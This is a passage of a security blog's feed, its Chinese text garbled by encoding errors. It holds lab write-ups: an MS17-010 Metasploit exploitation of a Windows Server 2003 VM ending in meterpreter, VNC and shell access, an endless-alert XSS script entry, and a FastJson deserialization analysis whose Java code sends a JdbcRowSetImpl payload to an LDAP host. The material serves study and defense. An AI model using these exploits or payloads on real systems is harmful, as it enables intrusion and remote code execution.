•è™«ç‰¹æ€§ï¼Œå¯ä»¥è‡ªæˆ‘å¤åˆ¶å’Œä¼ æ’­ã€‚</font></li></ul><h1 id="ç¯å¢ƒï¼š"><a href="#ç¯å¢ƒï¼š" class="headerlink" title="ç¯å¢ƒï¼š"></a>ç¯å¢ƒï¼š</h1><p>Windows Server 2003 ip: 192.168.126.128    å…³é—­é˜²ç«å¢™</p><p>Kali ip: 192.168.126.129</p><p>Windows Server 2003</p><p>ipåœ°å€ï¼š 192.168.126.128</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021743813.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510291637576.png"></p><p>å…³é—­é˜²ç«å¢™</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744811.png"></p><p>Kali</p><p>ip a</p><p>192.168.126.129</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744515.png"></p><h1 id="æ¼æ´åˆ©ç”¨ï¼š"><a href="#æ¼æ´åˆ©ç”¨ï¼š" class="headerlink" title="æ¼æ´åˆ©ç”¨ï¼š"></a>æ¼æ´åˆ©ç”¨ï¼š</h1><h2 id="1-ä½¿ç”¨nmapæ‰«ä¸€ä¸‹è¯¥ç½‘æ®µä¸»æœºçš„å­˜æ´»æƒ…å†µ"><a href="#1-ä½¿ç”¨nmapæ‰«ä¸€ä¸‹è¯¥ç½‘æ®µä¸»æœºçš„å­˜æ´»æƒ…å†µ" class="headerlink" title="1.ä½¿ç”¨nmapæ‰«ä¸€ä¸‹è¯¥ç½‘æ®µä¸»æœºçš„å­˜æ´»æƒ…å†µ"></a>1.<font style="color:rgb(77, 77, 77);">ä½¿ç”¨</font><font style="color:rgb(78, 161, 219) !important;">nmap</font><font style="color:rgb(77, 77, 77);">æ‰«ä¸€ä¸‹è¯¥ç½‘æ®µä¸»æœºçš„å­˜æ´»æƒ…å†µ</font></h2><p><code>nmap -sS 192.168.126.0/24</code></p><p>æ‰¾åˆ° IPä¸ºï¼š192.168.126.128 çš„ä¸»æœºå¼€å¯</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021751981.png"></p><h2 id="2-æ‰«æè¯¥ä¸»æœºç«¯å£ä»1-1000çš„å¼€æ”¾æƒ…å†µ"><a href="#2-æ‰«æè¯¥ä¸»æœºç«¯å£ä»1-1000çš„å¼€æ”¾æƒ…å†µ" class="headerlink" title="2.æ‰«æè¯¥ä¸»æœºç«¯å£ä»1-1000çš„å¼€æ”¾æƒ…å†µ"></a>2.<font style="color:rgb(77, 77, 77);">æ‰«æè¯¥ä¸»æœºç«¯å£ä»1-1000çš„å¼€æ”¾æƒ…å†µ</font></h2><p><code>nmap -p 1-1000 192.168.126.128</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744177.png"></p><h2 id="3-æ‰«æè¯¥ä¸»æœºçš„æ“ä½œç³»ç»Ÿç±»å‹"><a href="#3-æ‰«æè¯¥ä¸»æœºçš„æ“ä½œç³»ç»Ÿç±»å‹" class="headerlink" title="3.æ‰«æè¯¥ä¸»æœºçš„æ“ä½œç³»ç»Ÿç±»å‹"></a><font style="color:rgb(77, 77, 77);">3.æ‰«æè¯¥ä¸»æœºçš„æ“ä½œç³»ç»Ÿç±»å‹</font></h2><p><code>nmap -O 192.168.126.128</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744430.png"></p><h2 id="4-æ‰«æè¯¥ä¸»æœºä¸Šçš„æ¼æ´"><a href="#4-æ‰«æè¯¥ä¸»æœºä¸Šçš„æ¼æ´" class="headerlink" title="4.æ‰«æè¯¥ä¸»æœºä¸Šçš„æ¼æ´"></a>4.<font style="color:rgb(77, 77, 77);">æ‰«æè¯¥ä¸»æœºä¸Šçš„æ¼æ´</font></h2><p><code>nmap --script=vuln 192.168.126.128</code></p><p>å­˜åœ¨ ms17-010 æ°¸æ’ä¹‹è“</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744647.png"></p><blockquote><p><strong>Metasploit</strong>é¡¹ç›®æ˜¯ä¸€ä¸ªæ—¨åœ¨æä¾›å®‰å…¨æ¼æ´ä¿¡æ¯è®¡ç®—æœºå®‰å…¨é¡¹ç›®ï¼Œå¯ä»¥ååŠ©å®‰å…¨å·¥ç¨‹å¸ˆè¿›è¡Œæ¸—é€æµ‹è¯•ï¼ˆpenetration testingï¼‰åŠå…¥ä¾µæ£€æµ‹ç³»ç»Ÿç­¾åå¼€å‘ã€‚</p><p>Metasploité¡¹ç›®æœ€ä¸ºçŸ¥åçš„å­é¡¹ç›®æ˜¯å¼€æºçš„Metasploitæ¡†æ¶ï¼Œä¸€å¥—é’ˆå¯¹è¿œç¨‹ä¸»æœºè¿›è¡Œå¼€å‘å’Œæ‰§è¡Œâ€œexploitä»£ç â€çš„å·¥å…·ã€‚å…¶ä»–é‡è¦çš„å­é¡¹ç›®åŒ…æ‹¬Opcodeæ•°æ®åº“ã€shellcodeæ¡£æ¡ˆã€å®‰å…¨ç ”ç©¶ç­‰å†…å®¹ã€‚</p><p>Metasploité¡¹ç›®çŸ¥åçš„åŠŸèƒ½è¿˜åŒ…æ‹¬åå–è¯ä¸è§„é¿å·¥å…·ï¼Œå…¶ä¸­çš„æŸäº›å·¥å…·å·²ç»å†…ç½®åœ¨Metasploit Frameworké‡Œé¢ã€‚</p><p><code>Metasploit</code><font style="color:rgb(85, 86, 102);">ï¼ˆMSFï¼‰æ˜¯ä¸€ä¸ªå…è´¹çš„ã€å¯ä¸‹è½½çš„æ¡†æ¶ï¼Œé€šè¿‡å®ƒå¯ä»¥å¾ˆå®¹æ˜“åœ°è·å–ã€å¼€å‘å¹¶å¯¹è®¡ç®—æœºè½¯ä»¶æ¼æ´å®æ–½æ”»å‡»ã€‚</font></p><p><font style="color:rgb(85, 86, 102);">å®ƒæœ¬èº«é™„å¸¦æ•°ç™¾ä¸ªå·²çŸ¥è½¯ä»¶æ¼æ´ï¼Œ</font><strong><font style="color:rgb(85, 86, 102);">æ˜¯ä¸€æ¬¾ä¸“ä¸šçº§æ¼æ´æ”»å‡»å·¥å…·</font></strong></p><p><font style="color:rgb(85, 86, 102);">å› ä¸ºåªè¦æŒæ¡MSFçš„ä½¿ç”¨æ–¹æ³•ï¼Œæ¯ä¸ªäººéƒ½å¯ä»¥ä½¿ç”¨MSFæ¥æ”»å‡»é‚£äº›æœªæ‰“è¿‡è¡¥ä¸æˆ–è€…åˆšåˆšæ‰“è¿‡è¡¥ä¸çš„æ¼æ´ã€‚</font></p></blockquote><h2 id="5-è¿›å…¥å·¥å…·"><a href="#5-è¿›å…¥å·¥å…·" class="headerlink" title="5.è¿›å…¥å·¥å…·"></a>5.è¿›å…¥å·¥å…·</h2><p><code>msfconsole</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744725.png"></p><h2 id="6-æœç´¢ç›¸å…³æ¼æ´"><a href="#6-æœç´¢ç›¸å…³æ¼æ´" class="headerlink" title="6.æœç´¢ç›¸å…³æ¼æ´"></a><font style="color:rgb(77, 77, 77);">6.æœç´¢ç›¸å…³æ¼æ´</font></h2><p><code>search ms17-010</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744694.png"></p><h2 id="7-é€‰æ‹©æ¨¡å—"><a href="#7-é€‰æ‹©æ¨¡å—" class="headerlink" title="7.é€‰æ‹©æ¨¡å—"></a>7.é€‰æ‹©æ¨¡å—</h2><p><code>use 10</code> è¿œç¨‹æ‰§è¡Œä»£ç </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744248.png"></p><h2 id="8-æ˜¾ç¤ºé…ç½®é¡¹"><a href="#8-æ˜¾ç¤ºé…ç½®é¡¹" class="headerlink" title="8.æ˜¾ç¤ºé…ç½®é¡¹"></a>8.<font style="color:rgb(77, 77, 77);">æ˜¾ç¤ºé…ç½®é¡¹</font></h2><p><code>show options</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021750849.png" alt="img"></p><h2 id="9-è®¾ç½®ä¸€ä¸‹RHOSTS-é¶æœºçš„ipåœ°å€"><a href="#9-è®¾ç½®ä¸€ä¸‹RHOSTS-é¶æœºçš„ipåœ°å€" class="headerlink" title="9.è®¾ç½®ä¸€ä¸‹RHOSTS(é¶æœºçš„ipåœ°å€)"></a><font style="color:rgb(77, 77, 77);">9.è®¾ç½®ä¸€ä¸‹</font><code>RHOSTS</code><font style="color:rgb(77, 77, 77);">(é¶æœºçš„ipåœ°å€)</font></h2><p><code>set RHOSTS 192.168.126.128</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745740.png"></p><h2 id="10-æ‰§è¡Œæ”»å‡»"><a href="#10-æ‰§è¡Œæ”»å‡»" class="headerlink" title="10.æ‰§è¡Œæ”»å‡»"></a>10.æ‰§è¡Œæ”»å‡»</h2><p><code>run æˆ–è€… exploit</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745876.png"></p><p>è¿è¡ŒæˆåŠŸä¼šå‡ºç° meterpreter &gt;</p><blockquote><p>Meterpreter æ˜¯ Metasploit çš„ä¸€ä¸ªæ‰©å±•æ¨¡å—ï¼Œå¯ä»¥è°ƒç”¨ Metasploit çš„ä¸€äº›åŠŸèƒ½ï¼Œ<br>å¯¹ç›®æ ‡ç³»ç»Ÿè¿›è¡Œæ›´æ·±å…¥çš„æ¸—é€ï¼Œå¦‚è·å–å±å¹•ã€ä¸Šä¼ &#x2F;ä¸‹è½½æ–‡ä»¶ã€åˆ›å»ºæŒä¹…åé—¨ç­‰ã€‚</p></blockquote><p><code>help</code><font style="color:rgb(77, 77, 77);">å‘½ä»¤å¯ä»¥æŸ¥çœ‹å¯ä»¥ä½¿ç”¨å“ªäº›å‘½ä»¤</font></p><p><code>screenshot</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745278.png"></p><p>xdg-open &#x2F;root&#x2F;KMSzAlpc.jpeg</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745753.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745455.png"></p><p><code>run vnc</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745593.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745149.png"></p><p><code>shell</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021746089.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021746672.png"></p><h1 id="é¢„é˜²æ–¹æ¡ˆ"><a href="#é¢„é˜²æ–¹æ¡ˆ" class="headerlink" title="é¢„é˜²æ–¹æ¡ˆ"></a><font style="color:rgb(79, 79, 79);">é¢„é˜²æ–¹æ¡ˆ</font></h1><ul><li><font style="color:rgb(51, 51, 51);">æ‰“å¼€é˜²ç«å¢™ï¼Œå®‰è£…æ€æ¯’è½¯ä»¶ã€‚</font></li><li><font style="color:rgb(51, 51, 51);">å…³é—­445ç«¯å£åŠä¸å¿…è¦çš„æœåŠ¡ã€‚</font></li><li><font style="color:rgb(51, 51, 51);">å®‰è£…å¯¹åº”è¡¥ä¸ã€‚</font></li></ul><h1 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h1><p><a href="https://blog.csdn.net/qq_61839115/article/details/129951295">https://blog.csdn.net/qq_61839115&#x2F;article&#x2F;details&#x2F;129951295</a></p><p><a href="https://blog.csdn.net/m0_65712192/article/details/127637917">https://blog.csdn.net/m0_65712192&#x2F;article&#x2F;details&#x2F;127637917</a></p>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ¼æ´å¤ç°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss_lab</title>
    <link href="/2025/10/29/xss_lab/"/>
    <url>/2025/10/29/xss_lab/</url>
    
    <content type="html"><![CDATA[<script>while(true){alert(1);}</script>]]></content>
    
    
    <categories>
      
      <category>1</category>
      
    </categories>
    
    
    <tags>
      
      <tag>1</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FastJsonååºåˆ—åŒ–</title>
    <link href="/2025/10/21/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/10/21/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="FastJsonååºåˆ—åŒ–"><a href="#FastJsonååºåˆ—åŒ–" class="headerlink" title="FastJsonååºåˆ—åŒ–"></a>FastJsonååºåˆ—åŒ–</h1><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><p>å®˜æ–¹æºç ï¼š <a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p><p>ä½¿ç”¨æ‰‹å†Œï¼š <a href="https://www.w3cschool.cn/fastjson/">https://www.w3cschool.cn/fastjson/</a></p><p>Fastjsonæ˜¯ä¸€ä¸ªJavaåº“ï¼Œå¯ç”¨äºå°†Javaå¯¹è±¡è½¬æ¢ä¸ºå®ƒä»¬çš„JSONè¡¨ç¤ºã€‚å®ƒè¿˜å¯ä»¥ç”¨äºå°†JSONå­—ç¬¦ä¸²è½¬æ¢ä¸ºç­‰æ•ˆçš„Javaå¯¹è±¡ã€‚Fastjsonå¯ä»¥å¤„ç†ä»»æ„Javaå¯¹è±¡ï¼ŒåŒ…æ‹¬æ²¡æœ‰æºä»£ç çš„é¢„å…ˆå­˜åœ¨çš„å¯¹è±¡ã€‚</p><p> <strong>Java å¯¹è±¡å’Œ JSON å­—ç¬¦ä¸²äº’ç›¸è½¬æ¢</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">String jsonStr = JSON.toJSONString(obj);        // å¯¹è±¡ â†’ JSON å­—ç¬¦ä¸²<br>MyClass obj = JSON.parseObject(jsonStr, MyClass.class); // JSON å­—ç¬¦ä¸² â†’ å¯¹è±¡<br></code></pre></td></tr></table></figure><h3 id="æ¼æ´å‚è€ƒï¼š"><a href="#æ¼æ´å‚è€ƒï¼š" class="headerlink" title="æ¼æ´å‚è€ƒï¼š"></a>æ¼æ´å‚è€ƒï¼š</h3><p>1.2.24åŠä»¥ä¸‹æ²¡æœ‰å¯¹åºåˆ—åŒ–çš„ç±»åšæ ¡éªŒ,å¯¼è‡´æ¼æ´äº§ç”Ÿ<br>1.2.25-1.2.41å¢åŠ äº†é»‘åå•é™åˆ¶ï¼Œæ›´æ”¹autoTypeé»˜è®¤ä¸ºå…³é—­é€‰é¡¹ã€‚<br>1.2.42ç‰ˆæœ¬æ˜¯å¯¹1.2.41åŠä»¥ä¸‹ç‰ˆæœ¬çš„é»‘åå•ç»•è¿‡,ä»£ç å†…æ›´æ–°å­—ç¬¦ä¸²é»‘åå•hashæ–¹å¼<br>1.2.43ç‰ˆæœ¬æ˜¯å¯¹1.2.42åŠä»¥ä¸‹ç‰ˆæœ¬çš„é»‘åå•ç»•è¿‡<br>1.2.44-1.2.45ç‰ˆæœ¬1.2.43ç‰ˆæœ¬é»‘åå•æ— æ³•ç»•è¿‡,å¯»æ‰¾æ–°çš„åˆ©ç”¨é“¾è¿›è¡Œåˆ©ç”¨<br>1.2.47ç‰ˆæœ¬ åˆ©ç”¨fastjsonå¤„ç†Classç±»æ—¶çš„æ“ä½œ,å°†æ¶æ„ç±»åŠ è½½åˆ°ç¼“å­˜ä¸­,å®ç°æ”»å‡»<br>1.2.62-1.2.67ç‰ˆæœ¬Classä¸ä¼šå†å¾€ç¼“å­˜ä¸­åŠ è½½æ¶æ„ç±»,å¯»æ‰¾æ–°çš„åˆ©ç”¨é“¾è¿›è¡Œçªç ´<br>1.2.68ç‰ˆæœ¬,ä½¿ç”¨æœŸæœ›ç±»AutoCloseableæ¥ç»•è¿‡fastjsonæ ¡éªŒ<br>1.2.72-1.2.80ä½¿ç”¨æœŸæœ›ç±»Throwableçš„å­ç±»,è¿›è¡Œç»•è¿‡</p><h3 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h3><p><a href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p><a href="https://yanghaoi.github.io/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/">https://yanghaoi.github.io/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/</a></p><p><a href="https://xz.aliyun.com/t/12728">https://xz.aliyun.com/t/12728</a><br><a href="https://mp.weixin.qq.com/s/SOKLC_No0hV9RhAavF2hcw">https://mp.weixin.qq.com/s/SOKLC_No0hV9RhAavF2hcw</a></p><p>Fastjsonï¼ˆTemplatesImpl&amp;JdbcRowSetImplï¼‰</p><p><a href="https://mp.weixin.qq.com/s/XPbbgLcBmHE7dmHswY_S3Q">https://mp.weixin.qq.com/s/XPbbgLcBmHE7dmHswY_S3Q</a></p><h2 id="å…³äº-autoType"><a href="#å…³äº-autoType" class="headerlink" title="å…³äº autoType"></a>å…³äº autoType</h2><p><strong>AutoType</strong> æ˜¯ Fastjson çš„ä¸€é¡¹åŠŸèƒ½ï¼šå½“ JSON é‡Œå‡ºç°ç‰¹æ®Šå­—æ®µ <code>@type</code> æ—¶ï¼ŒFastjson ä¼šæŠŠè¿™ä¸ªå­—ç¬¦ä¸²å½“ä½œ Java ç±»å‹çš„å…¨é™å®šåï¼ˆ<code>com.example.Foo</code>ï¼‰ï¼Œå°è¯•æŠŠè¯¥ JSON ååºåˆ—åŒ–ä¸ºå¯¹åº”çš„ Java ç±»å®ä¾‹ã€‚æ¢å¥è¯è¯´ï¼Œ<code>@type</code> è®© JSON èƒ½ç›´æ¥æŒ‡å®šè¦ç”Ÿæˆå“ªä¸ª Java ç±»çš„å¯¹è±¡ â€”â€” è¿™æ˜¯â€œå¤šæ€ååºåˆ—åŒ–â€çš„ä¸€ç§å®ç°æ–¹å¼ã€‚</p><p><code>@type</code> èƒ½è®©ä¸å—ä¿¡ä»»çš„ JSON æŒ‡å®šä»»æ„ç±»å»å®ä¾‹åŒ–ã€‚è®¸å¤š Fastjson æ¼æ´å°±æ˜¯åˆ©ç”¨äº†è¿™ç‚¹ï¼ˆ<code>com.sun.rowset.JdbcRowSetImpl</code> ï¼‰</p><p>å› æ­¤ï¼Œé»˜è®¤å…¨å¼€ AutoType ä¼šæŠŠåº”ç”¨æš´éœ²ç»™è¿œç¨‹ä»»æ„å¯¹è±¡åˆ›å»ºå’Œæ½œåœ¨çš„ä»£ç æ‰§è¡Œã€‚</p><h2 id="FastJson-1-2-24-ååºåˆ—åŒ–é“¾åˆ†æ"><a href="#FastJson-1-2-24-ååºåˆ—åŒ–é“¾åˆ†æ" class="headerlink" title="FastJson 1.2.24 ååºåˆ—åŒ–é“¾åˆ†æ"></a>FastJson 1.2.24 ååºåˆ—åŒ–é“¾åˆ†æ</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.fastjson122.demos.web;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastJsonController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//ååºåˆ—åŒ–åŸºæœ¬ä½¿ç”¨</span><br><br>        <span class="hljs-comment">//1.fastjson è§£æå˜é‡æ•°æ®</span><br>        <span class="hljs-comment">//Java å­—ç¬¦ä¸²é‡Œ &quot; éœ€è¦è½¬ä¹‰</span><br>        String str=<span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;theonefx\&quot;,\&quot;age\&quot;:666&#125;&quot;</span>;<br>        <span class="hljs-comment">// JSON.parseObject(String text) æ–¹æ³•ï¼ŒæŠŠ JSON å­—ç¬¦ä¸²è§£ææˆä¸€ä¸ª JSONObject å¯¹è±¡ï¼Œè§£æåï¼ŒFastjson ä¼šè‡ªåŠ¨æŠŠå­—ç¬¦ä¸²é‡Œçš„ JSON ç»“æ„è½¬æˆ Java å¯¹è±¡</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data1</span> <span class="hljs-operator">=</span> JSON.parseObject(str);<br>        <span class="hljs-comment">//ç›´æ¥è¾“å‡º JSONObject å¯¹è±¡</span><br>        System.out.println(data1);<br><br>        <span class="hljs-comment">//2.fastjson åŠ å…¥Userç±»è§£æ:ä¼ å…¥å…¶ä»–ç±»è§£æåé»˜è®¤æ‰§è¡Œ set getç±»æ–¹æ³•</span><br>        <span class="hljs-comment">// åœ¨ 1.2.25+ ä¹‹åé»˜è®¤å…³é—­äº† AutoType åŠŸèƒ½ã€‚ä¸»åŠ¨æ‹’ç»äº† @type è‡ªåŠ¨ç±»å‹ååºåˆ—åŒ–ã€‚</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">userStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.example.fastjson122.demos.web.User\&quot;,\&quot;age\&quot;:22,\&quot;name\&quot;:\&quot;xiaodi\&quot;&#125;&quot;</span>;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data2</span> <span class="hljs-operator">=</span> JSON.parseObject(userStr);<br>        System.out.println(data2);<br><br>        <span class="hljs-comment">//3.fastjson åŠ å…¥æ‰§è¡Œå‘½ä»¤è§£æ:FastJson æ”¯æŒ @type è¯­æ³•å¯¹åº”ç±»æ“ä½œ</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">testStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.example.fastjson001.demos.web.Test\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data3</span> <span class="hljs-operator">=</span> JSON.parseObject(testStr);<br>        System.out.println(data3);<br><br>        <span class="hljs-comment">//4.åŠ å…¥Pocç±»è§£æ:JdbcRowSetImplç±»è§£æåæ‰§è¡ŒsetDataSourceName setAutoCommitæ–¹æ³•</span><br>        <span class="hljs-comment">//æ³¨ï¼šæ§åˆ¶ dataSourceName å€¼åè°ƒ setAutoCommit è§¦å‘ connect é‡Œé¢çš„ lookup</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">pocStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://169.254.39.1:1389/rfkucd\&quot;, \&quot;autoCommit\&quot;:true&#125;\n&quot;</span>;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data4</span> <span class="hljs-operator">=</span> JSON.parseObject(pocStr);<br>        System.out.println(data4);<br><br>        <span class="hljs-comment">//è§¦å‘ fastjson ååºåˆ—åŒ–ç”¨åˆ° JSON.parseObject() &amp; JSON.parse()</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆ†æé“¾ï¼š"><a href="#åˆ†æé“¾ï¼š" class="headerlink" title="åˆ†æé“¾ï¼š"></a>åˆ†æé“¾ï¼š</h3><p>è°ƒè¯•åˆ†æï¼š</p><p>æ­¤å¤„ä¸‹æ–­ç‚¹è°ƒè¯•</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091619576.png" alt="null"></p><p><code>parseObject</code> æ–¹æ³•è°ƒç”¨ <code>parse</code> æ–¹æ³•è§£æå­—ç¬¦ä¸²</p><p><code>parse(text)</code> æ˜¯ Fastjson çš„åº•å±‚è§£ææ–¹æ³•ã€‚</p><p>å®ƒä¼šæ ¹æ®å­—ç¬¦ä¸²çš„å†…å®¹è¿”å›ä¸åŒçš„å¯¹è±¡ï¼š</p><ul><li><p>å¦‚æœæ˜¯ <code>{...}</code> â†’ è¿”å› <code>JSONObject</code></p></li><li><p>å¦‚æœæ˜¯ <code>[...]</code> â†’ è¿”å› <code>JSONArray</code></p></li><li><p>å¦‚æœæ˜¯æ™®é€šå€¼ â†’ è¿”å› <code>String</code>ã€<code>Number</code>ã€<code>Boolean</code> ç­‰ã€‚</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091620453.png" alt="null"></p><p><code>JSON.DEFAULT_TYPE_KEY</code> æ˜¯ä¸€ä¸ªå›ºå®šå€¼ <code>@type</code>ï¼Œä¸€æ—¦åˆ¤æ–­å€¼ä¸º <code>@type</code> ï¼Œå°±å°†å…¶è®¤ä¸ºæ˜¯ç±»çš„é™å®šï¼Œä¹‹åä¾¿å°è¯•åŠ è½½<code>com.sun.rowset.JdbcRowSetImpl</code> ç±»ã€‚å³ <code>@type</code> &#x3D; <code>com.sun.rowset.JdbcRowSetImpl</code>ï¼Œfastjson ä¼šå»åŠ è½½è¿™ä¸ªç±»ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091623495.png" alt="null"></p><p>æ­¥å…¥ <code>TypeUtils.loadClass</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091627769.png" alt="null"></p><p><code>config</code> æ˜¯ <code>ParserConfig</code> å¯¹è±¡ï¼Œä¿å­˜äº†å„ç§ç±»çš„ååºåˆ—åŒ–å™¨;<code>deserialze</code> æ–¹æ³•çš„ä¸‰ä¸ªå‚æ•°ï¼š</p><ol><li><p><code>this</code> â†’ å½“å‰è§£æå™¨ï¼ˆ<code>DefaultJSONParser</code>ï¼‰ï¼Œé‡Œé¢æœ‰ lexerã€ä¸Šä¸‹æ–‡ç­‰ä¿¡æ¯ã€‚</p></li><li><p><code>clazz</code> â†’ è¦ç”Ÿæˆçš„ Java ç±»ã€‚</p></li><li><p><code>fieldName</code> â†’ å­—æ®µåï¼ˆå¦‚æœè¿™æ˜¯æŸä¸ªå­—æ®µçš„å€¼ï¼‰ã€‚</p></li></ol><p>è¿™ä¸ªæ–¹æ³•ä¼šæ ¹æ® <code>clazz</code> çš„ç»“æ„ï¼Œä» JSON ä¸­å–å€¼ï¼Œå¹¶ç”¨åå°„æˆ–ç±»å‹è½¬æ¢æ¥åˆ›å»ºå¯¹è±¡å¹¶èµ‹å€¼</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091628887.png" alt="null"></p><p>åœ¨æ‰§è¡Œååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œå˜é‡ä¸­å‡ºç°äº† <code>JdbcRowSetImpl</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091634392.png" alt="null"></p><p>ç»è¿‡æ¼«é•¿çš„è·Ÿè¸ªï¼Œæ¥åˆ°äº†å…³é”®ç‚¹ã€‚ã€‚ï¼ˆå¯¹äºä¸€äº›ä¸é‡è¦çš„åˆ¤æ–­å¯ä»¥è·³è¿‡ï¼Œè¿½è¸ªå…³é”®ç‚¹ï¼‰</p><p>è¿™æ˜¯ååºåˆ—åŒ–RCEçš„è§¦å‘ç‚¹ï¼Œ<code>InitialContext</code> æ˜¯ JNDIï¼ˆJava Naming and Directory Interfaceï¼‰çš„å…¥å£ç±»ï¼Œ<code>lookup()</code> ä¼šæ ¹æ®ä¼ 